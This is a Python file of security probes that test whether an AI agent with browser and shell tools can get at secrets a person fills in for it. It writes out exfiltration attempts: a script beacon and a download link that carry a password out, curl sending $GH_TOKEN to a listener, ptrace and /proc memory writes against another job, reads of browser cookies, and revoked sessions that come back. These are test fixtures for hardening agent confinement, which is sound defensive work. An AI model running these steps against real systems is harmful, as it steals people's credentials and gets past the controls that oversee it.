    beacon = f"http://{ctx.host}:{ctx.port}/f1x-at"
    site_page(ctx, "f1x-done.html", f"<h1>landed</h1><script>new Image().src='{beacon}?at='+encodeURIComponent(location.href)</script>")
    hits, filled = [], []
    for page, action, method in (("f1xg.html", "/f1x-done.html", "get"), ("f1xe.html", "/echo", "post"), ("f1xr.html", "/redirect", "post")):
        tag = page.split(".")[0]
        x_form(ctx, page, tag, action, method, color="#0000ff")
        ctx.c.tool("browser", action="navigate", url="http://localhost:8000/" + page)
        filled.append(x_autofill(ctx, tag, "LOCALENC"))
        if filled[-1] == "refused":
            filled[-1] = f"{page}: the extension typed the username and refused the password"
            continue
        refs = refs_of(ctx.c.tool("browser", action="text")[0])
        ctx.c.tool("browser", action="click_ref", ref=refs.get("button", "e3"))
        time.sleep(2)
        text, _ = ctx.c.tool("browser", action="text")
        tabs, _ = ctx.c.tool("browser", action="tabs")
        if spelled_in(text, K.LOCAL_ENC):
            hits.append(f"{page}: text carries a spelling")
        if spelled_in(tabs, K.LOCAL_ENC):
            hits.append(f"{page}: tabs carries a spelling")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if any(spelled_in(path, K.LOCAL_ENC) for path, _ in list(ctx.L.rows) if path.startswith("/f1x-at")):
        hits.append("f1xg.html: the page loaded with the password in its address")
    if not all(filled):
        return "broken", f"the extension's fill did not reach every form ({filled})"
    refused = [f for f in filled if isinstance(f, str)]
    sent = 3 - len(refused)
    if not sent:
        return "broken", "the extension refused every form, so nothing was sent on: " + "; ".join(refused)
    return bool(hits), "; ".join(hits + refused) if hits else (
        f"after the person's fill and the agent's send ({sent} of 3 forms), no page, text or tab address carried any spelling of it"
        + "".join("; " + r for r in refused))


def f1b_x(ctx):
    """F1b with the extension's fill: LOCALAPP filled by the person, then the
    page left, by its own form (sent) or by the agent navigating away on the
    same site (left), then Back. Where the page comes back holding the
    password, the agent must not see it (screenshot, or the form in `text`)."""
    ctx.page()
    site_page(ctx, "f1bx-away.html", "<h1>away</h1>")
    out = []
    leaked = False
    for how in ("sent", "left"):
        tag = "f1bx" + how[0]
        x_form(ctx, tag + ".html", tag, "/done", color="#00ff00")
        ctx.c.tool("browser", action="navigate", url=f"http://localhost:8000/{tag}.html")
        if x_autofill(ctx, tag, "LOCALAPP") is not True:
            ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
            return "broken", f"the extension's fill never reached the page ({how})"
        if how == "sent":
            refs = refs_of(ctx.c.tool("browser", action="text")[0])
            ctx.c.tool("browser", action="click_ref", ref=refs.get("button", "e3"))
        else:
            ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f1bx-away.html")
        time.sleep(1.5)
        ctx.L.rows[:] = [r for r in ctx.L.rows if not r[0].startswith(f"/{tag}?")]
        ctx.c.tool("browser", action="back")
        time.sleep(2.5)
        image = shot(ctx)
        text, _ = ctx.c.tool("browser", action="text")
        lens = x_lengths(ctx, tag)
        restored = any(n > 0 for n in lens)
        shown = bool(image) or "[password]" in text
        if restored and shown:
            leaked = True
            out.append(f"{how}: Back brought the password back and the agent saw the page ("
                       + ("a screenshot" if image else "the form in text") + ")")
        elif restored:
            out.append(f"{how}: Back brought the password back and the page stayed hidden")
        else:
            out.append(f"{how}: Back brought nothing back (lengths {lens or 'none'})")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    return leaked, "; ".join(out)


def f6_x(ctx):
    """F6 with the extension's fill: LOCALAPP filled by the person, then the
    agent clicks the page's own link, which downloads the field's value. The
    file must not reach the agent's Downloads."""
    ctx.page()
    ctx.c.sh("rm -f ~/Downloads/f6*")
    x_form(ctx, "f6x.html", "f6x", "/done", after=(
        "<a id=dl style='position:absolute;left:40px;top:230px' href='/dl?v=' onclick=\"this.href='/dl?v='+"
        "encodeURIComponent(document.querySelector('input[type=password]').value)\">save a copy</a>"))
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f6x.html")
    if x_autofill(ctx, "f6x", "LOCALAPP") is not True:
        ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
        return "broken", "the extension's fill never reached the page"
    text = ctx.c.tool("browser", action="text")[0]
    link = (re.search(r"\[(e\d+)\] \[link\] save a copy", text) or [None, None])[1]
    if link:
        ctx.c.tool("browser", action="click_ref", ref=link)
    else:
        # A withheld tab lists no refs: the link is the page's fourth control.
        ctx.c.tool("browser", action="click_ref", ref="e4")
    time.sleep(4)
    note, _ = ctx.c.tool("browser", action="text")
    got, files = downloaded(ctx, K.LOCAL_PASSWORD)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    said = re.search(r"[^\n]*f6\.txt[^\n]*", note)
    return got, ("the file holding the filled password reached ~/Downloads" if got else
                 f"no file holding it reached ~/Downloads ({files})") + (f" ({said.group(0)[:110]})" if said else "")


def ask_revoke(ctx):
    """An ask-me login's answers go with the login: LOCALASK is filled, held,
    and allowed for 10 min by the person, and a second fill goes through on
    that (the control). The login is revoked and granted again (two
    deliveries); the next fill must be held again. Then an approval nobody
    collected, the same way."""
    ctx.page()
    x_form(ctx, "ask.html", "askx", "/done")

    def fill():
        ctx.c.tool("browser", action="navigate", url="http://localhost:8000/ask.html")
        refs = refs_of(ctx.c.tool("browser", action="text")[0])
        said, refused = ctx.c.tool("browser", action="fill", ref=refs.get("password", "e2"), secret="LOCALASK.password")
        return said.replace("\n", " "), refused

    def held():
        status, _, body = ctx.c.http("GET", "/secrets/uses")
        return [u for u in (json.loads(body).get("uses", []) if status == 200 else []) if u.get("secret") == "LOCALASK"]

    def answer(word):
        mine = held()
        if mine:
            ctx.c.http("POST", "/secrets/uses/answer", {"id": mine[0]["id"], "answer": word})
        return bool(mine)

    steps = []
    said, refused = fill()
    if not refused or not answer("allow"):
        return "broken", "the first fill of an ask-me login was not held: " + said[:100]
    said, refused = fill()
    if refused:
        return "broken", "the fill the person allowed was not typed: " + said[:100]
    said, refused = fill()
    if refused or held():
        return "broken", "a fill inside the allowance asked again, so the revocation would prove nothing: " + said[:100]
    steps.append("allowed, then a second fill went through on it")
    revoked = ctx.deliver(without=["LOCALASK"])
    gone, gone_refused = fill()
    granted = ctx.deliver()
    if revoked != 204 or granted != 204 or not gone_refused:
        return "broken", f"the login could not be revoked and granted again (PUT {revoked}, {granted}; fill while revoked: {gone[:60]})"
    said, refused = fill()
    asked = refused and bool(held())
    leaks = [] if asked else ["after the revoke and the new grant the fill went through on the old allowance: " + said[:80]]
    steps.append("revoked and granted again: the next fill " + ("asked again" if asked else "did NOT ask"))
    # An approval nobody collected, then the same revoke and grant.
    if asked and answer("approve"):
        ctx.deliver(without=["LOCALASK"])
        ctx.deliver()
        said, refused = fill()
        again = refused and bool(held())
        if not again:
            leaks.append("an approval given before the revoke let the fill after it through: " + said[:80])
        steps.append("approved, revoked and granted again before the retry: the retry " + ("asked again" if again else "did NOT ask"))
    answer("deny")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    return bool(leaks), "; ".join(leaks) if leaks else "; ".join(steps)


# --- Shield's review of rc.3: two live jobs, minting, what a job reaches (point 4) ----

def f2x(ctx):
    """F2 with two live jobs at once, A and B, each with its own stand-in and
    proxy credential, each holding a connection of its own open through the
    proxy. Each uses the other's credential, the other's stand-in, both, and
    the other's credential from an address that aliases the other's held
    connection (127.0.0.N with its local port). The bound service must get
    the key only from each job's own call."""
    if not ctx.bound:
        return None, "needs a protected key (--delivery protected)"
    url = f"https://{ctx.host}:{ctx.bound.port}"
    ctx.c.sh("rm -f ~/probe/pair-*")
    for me, other in (("A", "B"), ("B", "A")):
        ctx.c.tool("shell", action="start", command=f"exec env J9={me} python3 ~/{JOB} pair {url} {me} {other} 45", wait_ms=300)
    said = {}
    for _ in range(120):
        for me in ("A", "B"):
            said[me] = ctx.c.sh(f"cat ~/probe/pair-{me}.out 2>/dev/null")[0].strip()
        if all(said.values()):
            break
        time.sleep(0.5)
    own = all(ctx.bound.heard(f"/f2x-own-{me}", only=[K.GH]) for me in "AB")
    if not own:
        return "broken", "a job's own call never reached the bound service with the key: " + "; ".join(f"{m}: {v}" for m, v in said.items())
    took = [f"{me} with {how}" for me in "AB" for how in ("cred", "standin", "both", "alias")
            if ctx.bound.heard(f"/f2x-{how}-{me}", only=[K.GH])]
    names = {"cred": "the other's proxy credential", "standin": "the other's stand-in", "both": "both of the other's",
             "alias": "the other's credential from an address aliasing its connection"}
    return bool(took), (("the bound service received the key from " + ", ".join(
        t.split(" with ")[0] + " using " + names[t.split(" with ")[1]] for t in took)) if took else
        "each job's own call reached the service with the key; none using the other's credential, stand-in, both or an aliased address did") + \
        " (A: " + said.get("A", "no answer") + " | B: " + said.get("B", "no answer") + ")"


def f2m(ctx):
    """A protected key and a route that mints keys: the delivery refuses the
    fixture's /app/installations/*/access_tokens and /authorizations, which
    answer the real key with a fresh token. Two jobs, each through its own
    proxy credential, ask for one in nine spellings and once in absolute
    form after a CONNECT of their own. The service must never get the key
    there, and no job a token. A harmless call must reach it with the key."""
    if not ctx.bound:
        return None, "needs a protected key (--delivery protected)"
    url = f"https://{ctx.host}:{ctx.bound.port}"
    ctx.c.sh(f'curl -s -m8 -o /dev/null {url}/f2m-ok -H "Authorization: Bearer $GH_TOKEN"')
    if not ctx.bound.heard("/f2m-ok", only=[K.GH]):
        return "broken", "a harmless call never reached the bound service with the key"
    out = {}
    for tag in ("m1", "m2"):
        out[tag] = (re.search(r"MINT (.*)", job(ctx, "mint", url, tag)) or [None, "no answer"])[1]
    minted = [tag for tag, line in out.items() if re.search(r"=201\b", line)]
    heard = sorted({tag for path, text in list(ctx.bound.rows) for tag in out if f"m={tag}" in path and K.GH in text})
    leaked = bool(minted or heard)
    return leaked, (("the minting route " + ("handed a token to " + ", ".join(minted) if minted else "")
                     + ("; the service received the key from " + ", ".join(heard) if heard else "")) if leaked else
                    "no spelling reached the minting routes with the key, through either job's proxy") + \
        " (" + " | ".join(f"{t}: {line}" for t, line in out.items()) + ")"


def x8(ctx):
    """What a confined job reaches: every TCP and UDP listener and every unix
    socket on the computer, tried from a job. On the split computer the only
    ones of another user a job may reach are its key proxy (127.0.0.1:3128)
    and the door (:8787, which answers nothing without the bearer); the way
    out (the host's listener) stays open."""
    if not ctx.split:
        return None, "the single-user computer confines no job: the service and every socket are the job's own user (X1-X7)"
    out = job(ctx, "reach", ctx.host, str(ctx.port))
    rows = re.findall(r"^REACH (\S+) (\S+) owner=(\S+) (\S+)$", out, re.M)
    if not rows:
        return "broken", "the job listed nothing: " + out.strip()[:80]
    door = (re.search(r"^DOOR (\S+)", out, re.M) or [None, "?"])[1]
    egress = (re.search(r"^EGRESS \S+ (\S+)", out, re.M) or [None, "?"])[1]
    allowed = {("tcp", "127.0.0.1:3128"): "its proxy"}
    if door == "401":
        allowed.update({("tcp", "0.0.0.0:8787"): "the door", ("tcp", ":::8787"): "the door"})
    foreign, mine, refused = [], 0, []
    for kind, where, owner, result in rows:
        if result.startswith("refused"):
            refused.append(where.rsplit("/", 1)[-1] if kind == "unix" else where)
            continue
        if owner == "agent":
            mine += 1
            continue
        if (kind, where) not in allowed:
            foreign.append(f"{kind} {where} ({owner})")
    seen = ", ".join(sorted({f"{v} {k[1]}" for k, v in allowed.items() if any((r[0], r[1]) == k for r in rows)}))
    return bool(foreign), (("a job reaches what is not its own: " + ", ".join(foreign)) if foreign else
                           f"a job reaches only its own user's {mine} endpoints and {seen} (the door answers {door} without the bearer)") + \
        f"; refused: {', '.join(refused) or 'none'}; the host's listener: {egress}"


def x9(ctx):
    """Jobs run as one user: job B against job A, which holds a connection
    of its own open through the proxy. PTRACE_ATTACH on A, a write into A's
    memory through /proc/<pid>/mem, and pidfd_getfd of A's held connection,
    then used with A's stand-in: running inside A, or with A's connection,
    B uses A's proxy authority, which F2 and F2x keep to each job."""
    if not ctx.bound:
        return None, "needs a protected key (--delivery protected)"
    url = f"https://{ctx.host}:{ctx.bound.port}"
    ctx.c.sh("rm -f ~/probe/x9-hold.out ~/probe/x9-hold.json")
    ctx.c.tool("shell", action="start", command=f"exec env J10=A python3 ~/{JOB} hold {url} 40", wait_ms=300)
    held = ""
    for _ in range(40):
        held = ctx.c.sh("cat ~/probe/x9-hold.out 2>/dev/null")[0].strip()
        if held:
            break
        time.sleep(0.5)
    if " 200 " not in held + " ":
        return "broken", "job A never held a connection through the proxy: " + (held or "no answer")
    out = (re.search(r"^X9 (.*)$", job(ctx, "borrow", url), re.M) or [None, "no answer"])[1]
    used = ctx.bound.heard("/x9-borrow", only=[K.GH])
    hits = [w for w, hit in (("PTRACE_ATTACH", "attach=ok" in out), ("a write into its memory", "memwrite=ok" in out),
                              ("its held connection, with the key sent on it", used)) if hit]
    return bool(hits), (("job B, as the same user, got job A's " + ", ".join(hits)) if hits else
                        "job B could neither attach to job A, write its memory nor take its connection") + f" ({out})"


# --- Shield's review of rc.3: revocation across a stop and a restart (point 5) -------

def signed_in_running(ctx):
    out = ctx.c.sh("ps -eo user=,comm= | awk '$1==\"signin\" && $2 ~ /chrom/' | wc -l")[0].strip()
    return out.isdigit() and int(out) > 0


def f8_share(ctx, name, value):
    cookie = {"name": name + "sid", "value": value, "domain": "localhost", "path": "/", "secure": False,
              "httpOnly": False, "expires": time.time() + 86400}
    status, _, _ = ctx.c.http("PUT", f"/sessions/{name}", {"sites": ["http://localhost:8000"], "cookies": [cookie], "storage": {}})
    return status


def f8_look(ctx):
    ctx.page()
    site_page(ctx, "f8.html", "<p id=c></p><script>document.getElementById('c').textContent='cookie='+document.cookie</script>")
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f8.html")
    text, _ = ctx.c.tool("browser", action="text")
    return text


def f8i(ctx, restart=False, kill=False):
    """F8 with the signed-in browser idled out: the share is used, the browser
    stops by itself (10 min with nobody using it), the share is revoked
    while it is stopped, and the site is opened again."""
    value = "hl-share-f8i-" + str(int(time.time()))
    status = f8_share(ctx, "f8i", value)
    if status != 200:
        return None, f"PUT /sessions answered {status}: no signed-in browser shares here"
    before = f8_look(ctx)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if value not in before:
        return "broken", "the shared cookie never reached the page: " + before.replace("\n", " ")[:80]
    started = time.time()
    while signed_in_running(ctx) and time.time() - started < 780:
        time.sleep(20)
    if signed_in_running(ctx):
        return "broken", "the signed-in browser never idled out in 13 min"
    idle = int(time.time() - started)
    status, _, said = ctx.c.http("DELETE", "/sessions/f8i")
    started_by_revoke = signed_in_running(ctx)
    if restart or kill:
        ctx.restart(hard=kill)
    after = f8_look(ctx)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    kept = value in after
    return kept, (("the revoked share's cookie came back when the site was opened again" if kept else
                   "the revoked share's cookie stayed gone when the site was opened again")
                  + f" (stopped {idle} s after its last use and revoked while stopped, after which it was "
                  + ("running again" if started_by_revoke else "still stopped")
                  + (", then the computer was killed and started" if kill else ", then the computer restarted" if restart else "")
                  + f": DELETE {status} {said.decode()[:80]})")


def f8r(ctx, kill=False):
    """F8 with a restart: the share is used, and kept long enough that
    Chromium has written its cookie to the profile (it writes about every
    30 s), then revoked while the browser runs, and the computer is stopped
    and started at once (the desk delivers the secrets again; LOCALAPP still
    names the site). Then the site is opened."""
    value = "hl-share-f8r-" + str(int(time.time()))
    status = f8_share(ctx, "f8r", value)
    if status != 200:
        return None, f"PUT /sessions answered {status}: no signed-in browser shares here"
    before = f8_look(ctx)
    if value not in before:
        return "broken", "the shared cookie never reached the page: " + before.replace("\n", " ")[:80]
    time.sleep(40)
    if value not in f8_look(ctx):
        return "broken", "the shared cookie was gone before the revoke"
    status, _, said = ctx.c.http("DELETE", "/sessions/f8r")
    ctx.restart(hard=kill)
    ctx.c.sh("mkdir -p ~/probe")
    ctx.c.tool("files", action="put", path="probe/job.py", content=ctx.job_source)
    ctx.c.tool("files", action="put", path="probe/pages.py", content=ctx.pages_source)
    after = f8_look(ctx)
    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
    if "cookie=" not in after:
        return "broken", "after the restart the page did not show: " + after.replace("\n", " ")[:80]
    kept = value in after
    how = "a kill and a start" if kill else "the restart"
    return kept, (f"the revoked share's cookie came back after {how}" if kept else
                  f"the revoked share's cookie stayed gone after {how}") + f" (DELETE {status}: {said.decode()[:80]})"


PROBES = [
    ("A1", "variable read back in another spelling by a shell job", a1),
    ("A2", "files get of a file holding the value in base64", a2),
    ("A3", "a job's key rendered on screen matches the real key's pixels", a3),
    ("A3s", "a screenshot or capture shows a sign-in page while a secret is typed", a3s),
    ("A4", "eval btoa(field.value) after browser fill of a login", a4),
    ("A4v", "browser fill of a variable on any page, read back", a4v),
    ("A5", "clipboard read", a5),
    ("A6", "raw job log holds a login password", a6),
    ("A6v", "a variable's value in a job log or a readable /proc environ", a6v),
    ("A7", "GET /files/download of a raw job log", a7),
    ("A8", "TOTP digits come back unredacted", a8),
    ("B1", "variable curl'd to a listener on the host bridge", b1),
    ("B1b", "login password from the bridge POSTed to the listener", b1b),
    ("B2", "variable typed into a form and submitted to the listener", b2),
    ("B3", "DNS exfiltration reachability", b3),
    ("B4", "value written to the workspace appears on the host", b4),
    ("B5", "desk tools and model call carry a value", b5),
    ("B6", "bearer readable from /proc/*/environ", b6),
    ("BR-fill", "bridge fill returns a login password to a job", br_fill),
    ("BR-logins", "bridge logins lists a login and username to a job", br_logins),
    ("BR-get", "bridge get signs a job-chosen challenge", br_get),
    ("BR-askme", "bridge ask-me fill answered without approval", br_askme),
    ("askme_job", "a job's held ask-me fill gives the password after one approval", askme_job),
    ("memscan", "login password and passkey key in service memory", memscan),
    ("X1", "service private files readable by a job", x_files),
    ("X2", "service /proc environ or mem readable by a job", proc_line("X2", lambda l: "environ=True" in l or "mem=True" in l)),
    ("X3", "the (signed-in) browser's /proc environ or mem readable by a job", proc_line("X3", lambda l: "environ=True" in l or "mem=True" in l)),
    ("X4", "job can ptrace-attach the (signed-in) browser", proc_line("X4", lambda l: l.startswith("attach=ok"))),
    ("X5", "job connects to the bridge socket", proc_line("X5", lambda l: l.startswith("connected"))),
    ("X6", "a DevTools port of the service or the signed-in browser, or a secret through one, answers a job", x6),
    ("X7", "job may signal the service process", proc_line("X7", lambda l: l.startswith("may-signal"))),
    ("9222-list", "curl 127.0.0.1:9222/json/list lists the tab", p9222),
    ("xinput", "job sees raw key presses on the display", xinput),
    ("J1", "curl with GH_TOKEN: listener receives the real key", j("j1", 'curl -s -m8 http://{H}:{P}/{T} -H "Authorization: Bearer $GH_TOKEN"', works=True)),
    ("J2", "python urllib 'token' scheme: listener receives the real key", j("j2", J_PY, works=True)),
    ("J3", "git Basic credential helper: listener receives the real key", j("j3", J_GIT, works=True)),
    ("J4", "reflecting endpoint hands the real key back to the job", j4),
    ("J5", "key in a request body: listener receives the real key", j("j5", 'curl -s -m8 http://{H}:{P}/{T} -d "content=$GH_TOKEN"')),
    ("J6", "unbound host: listener receives the real key", j6),
    ("J7", "node fetch with GH_TOKEN", j7),
    ("N1", "sqlite read of a signed-in site's cookie from the browser profile", n1),
    ("N1b", "cat ~/.hotline/logins/*.json shows a shared cookie", n1b),
    ("N2", "snapshot still holds a share after the person revokes it", n2),
    ("N3", "upgrade from a 0.12 home leaves no readable cookie or login file", n3),
    ("N6b", "general browser finds a passkey for an attacker challenge", n6b),
    ("F1a", "a login's password typed into a GET form's text field, read back from tabs, Back or screenshot", f1a),
    ("F1b", "Back restores a typed password field and the tab is shown again", f1b),
    ("F1c", "a page or address carries the password percent-, form-, base64- or entity-encoded", f1c),
    ("F2", "a process left by one job uses its ended job's or a later job's stand-in through the proxy", f2),
    ("F3", "the capabilities attest can be made by a bearer holder, replayed or read by a job", f3),
    ("F4", "a loopback login not granted readable is typed into a page a job serves", f4),
    ("F5", "a login's password is typed on a subdomain of its origin", f5),
    ("F6", "a download begun on a page mid sign-in reaches the agent", f6),
    ("F8", "a revoked share's session stays usable while another grant names its site", f8),
    ("F10", "a password POSTed to another site into a frame by an image button's formaction", f10),
    ("F9", "a password typed into its own site's GET form, sent by the browser, loads in an address", f9),
    ("S1", "a two-step sign-in whose script builds the password field with no form: refused, or read back", s1),
    ("S2", "a username refused because the page adds its button while it is typed", s2),
    ("A3s-x", "a screenshot, capture or text shows a sign-in page after the extension fills it", a3s_x),
    ("F1a-x", "a password the extension filled is carried by the next page, text or a tab's address", f1a_x),
    ("F1b-x", "Back restores a password the extension filled and the agent sees the page", f1b_x),
    ("F6-x", "a download from a page the extension filled reaches the agent", f6_x),
    ("AskRevoke", "an ask-me login's allowance or approval outlives the login's revocation", ask_revoke),
    ("F2x", "one of two live jobs uses the other's proxy credential or stand-in through the proxy", f2x),
    ("F2m", "a protected key reaches a key-minting route, or a job gets a minted token", f2m),
    ("X8", "a confined job reaches a listener or socket other than its own, its proxy and the door", x8),
    ("X9", "a job ptraces, writes into or takes the proxy connection of another job of the same user", x9),
    ("F8i", "a share revoked while the signed-in browser is idled out is usable when the site reopens", f8i),
    ("F8r", "a share revoked before a restart is usable when the site reopens after it", f8r),
    ("F8ir", "a share revoked while idled out, then a restart: usable when the site reopens", lambda ctx: f8i(ctx, restart=True)),
    ("F8ik", "a share revoked while idled out, the computer killed within 5 s: usable when the site reopens", lambda ctx: f8i(ctx, kill=True)),
    ("F8rk", "a share revoked while the browser runs, the computer killed within 5 s: usable when the site reopens", lambda ctx: f8r(ctx, kill=True)),
]
